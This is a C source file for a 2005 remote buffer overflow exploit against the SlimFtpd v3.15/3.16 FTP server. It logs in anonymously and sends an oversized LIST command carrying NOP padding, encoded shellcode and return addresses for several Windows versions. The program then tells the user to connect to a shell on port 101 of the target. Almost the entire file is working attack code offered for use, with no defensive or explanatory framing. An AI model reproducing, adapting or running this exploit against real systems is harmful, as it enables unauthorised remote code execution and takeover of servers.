/*
*
*	Written by redsand
*	<redsand@redsand.net>
*
*	Jul 22, 2005
*	Vulnerable: SlimFtpd v3.15 and v3.16
*	origional vuln found by: 
*
*	Usage: ./redslim 127.0.0.1 [# OS RET ]
*
*/



#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN
  #include <winsock2.h>
  #include <windows.h>
// #pragma lib <ws2_32.lib> // win32-lcc specific
  #pragma comment(lib, "ws2_32.lib") // ms vc++
#else
  #include <unistd.h>
  #include <sys/socket.h>
  #include <sys/types.h>
  #include <arpa/inet.h>
  #include <netdb.h>
#endif


#define USERNAME	"anonymous"
#define PASSWORD	"log@in.net"


// buf size = 512 + max

#define NOP				0x90	
#define BUFSIZE			2048
#define PORT			21
#define LSZ				525 

unsigned char *login [] = { "USER "USERNAME"\r\n", "PASS "PASSWORD"\r\n", "LIST ", "XMKD AAAAAAAA\r\n", "CWD AAAAAAAA\r\n", NULL };

unsigned char *targets [] =
        {
            "Windows XP SP0/SP1 ",
			"Windows XP SP2 ",
            "Windows 2000 SP1/SP4 ",
			"Windows 2003 Server SP1",
			"Denial-of-Service",
             NULL
        };

unsigned long offsets [] =
        {
			// jmp esi
			0x71a5b80b, // Windows XP 5.1.1.0 SP1 (IA32) Windows XP 5.1.0.0 SP0 (IA32)
			0x77f1a322, // Windows XP 5.1.2.0 SP2 (IA32)
            0x74ffbb65, // Windows 2000 5.0.1.0 SP1 (IA32) Windows 2000 5.0.4.0 SP4 (IA32)
			0x77f7fe67, // Windows 2003 Server 5.2.1.0 SP1 (IA32)
            0x44434241,
			0
        };

unsigned char shellcode[] = "\xEB"
"\x0F\x58\x80\x30\x88\x40\x81\x38\x68\x61\x63\x6B\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF"
"\xFF\x60\xDE\x88\x88\x88\xDB\xDD\xDE\xDF\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xDC\x8D"
"\xF0\x89\x62\x03\xC2\x90\x03\xD2\xA8\x89\x63\x6B\xBA\xC1\x03\xBC\x03\x89\x66\xB9"
"\x77\x74\xB9\x48\x24\xB0\x68\xFC\x8F\x49\x47\x85\x89\x4F\x63\x7A\xB3\xF4\xAC\x9C"
"\xFD\x69\x03\xD2\xAC\x89\x63\xEE\x03\x84\xC3\x03\xD2\x94\x89\x63\x03\x8C\x03\x89"
"\x60\x63\x8A\xB9\x48\xD7\xD6\xD5\xD3\x4A\x80\x88\xD6\xE2\xB8\xD1\xEC\x03\x91\x03"
"\xD3\x84\x03\xD3\x94\x03\x93\x03\xD3\x80\xDB\xE0\x06\xC6\x86\x64\x77\x5E\x01\x4F"
"\x09\x64\x88\x89\x88\x88\xDF\xDE\xDB\x01\x6D\x60\xAF\x88\x88\x88\x18\x89\x88\x88"
"\x3E\x91\x90\x6F\x2C\x91\xF8\x61\x6D\xC1\x0E\xC1\x2C\x92\xF8\x4F\x2C\x25\xA6\x61"
"\x51\x81\x7D\x25\x43\x65\x74\xB3\xDF\xDB\xBA\xD7\xBB\xBA\x88\xD3\x05\xC3\xA8\xD9"
"\x77\x5F\x01\x57\x01\x4B\x05\xFD\x9C\xE2\x8F\xD1\xD9\xDB\x77\xBC\x07\x77\xDD\x8C"
"\xD1\x01\x8C\x06\x6A\x7A\xA3\xAF\xDC\x77\xBF\x77\xDD\xB8\xB9\x48\xD8\xD8\xD8\xD8"
"\xC8\xD8\xC8\xD8\x77\xDD\xA4\x01\x4F\xB9\x53\xDB\xDB\xE0\x8A\x88\x88\xED\x01\x68"
"\xE2\x98\xD8\xDF\x77\xDD\xAC\xDB\xDF\x77\xDD\xA0\xDB\xDC\xDF\x77\xDD\xA8\x01\x4F"
"\xE0\xCB\xC5\xCC\x88\x01\x6B\x0F\x72\xB9\x48\x05\xF4\xAC\x24\xE2\x9D\xD1\x7B\x23"
"\x0F\x72\x09\x64\xDC\x88\x88\x88\x4E\xCC\xAC\x98\xCC\xEE\x4F\xCC\xAC\xB4\x89\x89"
"\x01\xF4\xAC\xC0\x01\xF4\xAC\xC4\x01\xF4\xAC\xD8\x05\xCC\xAC\x98\xDC\xD8\xD9\xD9"
"\xD9\xC9\xD9\xC1\xD9\xD9\xDB\xD9\x77\xFD\x88\xE0\xFA\x76\x3B\x9E\x77\xDD\x8C\x77"
"\x58\x01\x6E\x77\xFD\x88\xE0\x25\x51\x8D\x46\x77\xDD\x8C\x01\x4B\xE0\x77\x77\x77"
"\x77\x77\xBE\x77\x5B\x77\xFD\x88\xE0\xF6\x50\x6A\xFB\x77\xDD\x8C\xB9\x53\xDB\x77"
"\x58\x68\x61\x63\x6B\x90";

long gimmeip(char *);
void keepout();
void shell(int);

void keepout() {
#ifdef WIN
   WSACleanup();
#endif
   exit(1);
}

void banner() {
	printf("- SlimFtpd v3.15 and v3.16 remote buffer overflow\n");
	printf("- Written by redsand (redsand [at] redsand.net)\n");
}

void usage(char *prog) {
  int i;
  banner();
  printf("- Usage: %s <target ip> <OS> [target port]\n", prog);
  printf("- Targets:\n");
  for (i=0; targets[i] != NULL; i++)
	printf("\t- %d\t%s\n", i, targets[i]);
  printf("\n");

  exit(1);
}

/***************************************************************/
long gimmeip(char *hostname) {
  struct hostent *he;
  long ipaddr;

  if ((ipaddr = inet_addr(hostname)) < 0) {
	if ((he = gethostbyname(hostname)) == NULL) {
	   printf("[x] Failed to resolve host: %s! Exiting...\n\n",hostname);
           keepout();
	}
  memcpy(&ipaddr, he->h_addr, he->h_length);
  }

  return ipaddr;
}

int main(int argc, char *argv[]) {
  int sock;
  char expbuff[BUFSIZE]; 
  char recvbuff[BUFSIZE];
  void *p;
  unsigned short tport = PORT; // default port for ftp
  struct sockaddr_in target;
  unsigned long retaddr;
  int len,i=0;
  unsigned int tar;

#ifdef WIN
  WSADATA wsadata;
  WSAStartup(MAKEWORD(2,0), &wsadata);
#endif


  if(argc < 3) usage(argv[0]);

  if(argc == 4)
    tport = atoi(argv[3]);

  banner();
  tar = atoi(argv[2]);
  retaddr = offsets[tar];


  printf("- Using return address of 0x%8x : %s\n",retaddr,targets[tar]);
  printf("\n[+] Initialize socket.");
  if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {
	perror("[x] Error socket. Exiting...\n");
	keepout();
  }

  memset(&target,0x00,sizeof(target));
  target.sin_family = AF_INET;
  target.sin_addr.s_addr = gimmeip(argv[1]);
  target.sin_port = htons(tport);


  printf("\n[+] Prepare exploit buffer... ");
  memset(expbuff, 0x00, BUFSIZE);
  memset(recvbuff, 0x00, BUFSIZE);
  

  memcpy(expbuff, login[2], strlen(login[2]));
  p =  &expbuff[strlen(login[2]) ];
 
  memset(p, NOP, LSZ);
  memcpy(&expbuff[10],shellcode,sizeof(shellcode)-1);

  *(unsigned long *)&expbuff[507] = retaddr;
  p =  &expbuff[511];
  memcpy(p, "\n",1);
  
  printf("\n[+] Connecting at %s:%hu...", argv[1], tport);
  fflush(stdout);
  if (connect(sock,(struct sockaddr*)&target,sizeof(target))!=0) {
  	fprintf(stderr,"\n[x] Couldn't establish connection. Exiting...\n");
  	keepout();
  }
  printf(" - OK.\n");
  len = recv(sock, recvbuff, BUFSIZE-1, 0);
  if(len < 0) {
	fprintf(stderr,"\nError response server\n");
  	exit(1);
  }
  
  printf("    - Size of payload is %d bytes",strlen(expbuff));


  printf("\n[+] Initiating exploit... ");
  printf("\n    - Sending USER...");
  if(send(sock,login[0],strlen(login[0]),0)==-1) {
	fprintf(stderr,"\n[-] Exploit failed.\n");
	keepout();
  }

  len = recv(sock, recvbuff, BUFSIZE-1,0);
  if(len < 0) {
	fprintf(stderr,"\nError recv.");
	exit(1);
  }
  recvbuff[len] = 0;

  printf("\n    - Sending PASS...");
  
  if(send(sock,login[1],strlen(login[1]),0)==-1) {
    printf("\n[-] Exploit failed.\n");
	keepout();
  }

  len = recv(sock, recvbuff, BUFSIZE, 0);
  if(len < 0) {
	fprintf(stderr,"\nError recv.");
	exit(1);
  }
  recvbuff[len] = 0;

  printf("\n    - Creating X-DIR...");
  
  if(send(sock,login[3],strlen(login[3]),0)==-1) {
    printf("\n[-] Exploit failed.\n");
	keepout();
  }

  len = recv(sock, recvbuff, BUFSIZE, 0);
  if(len < 0) {
	fprintf(stderr,"\nError recv.");
	exit(1);
  }
  recvbuff[len] = 0;

  if(send(sock,login[4],strlen(login[4]),0)==-1) {
    printf("\n[-] Exploit failed.\n");
	keepout();
  }

  len = recv(sock, recvbuff, BUFSIZE, 0);
  if(len < 0) {
	fprintf(stderr,"\nError recv.");
	exit(1);
  }
  recvbuff[len] = 0;

  printf("\n    - Sending Exploit String...");
  if(send(sock,expbuff,strlen(expbuff),0)==-1) {
	printf("\n[-] Exploit failed.\n");
	keepout();
  }

  printf("- OK.");
  
  printf("\n[+] Now try to connect to the shell on %s:101\n", argv[1] );



#ifdef WIN
  closesocket(sock);
  WSACleanup();
#else
  close(sock);
#endif

  return(0);
}
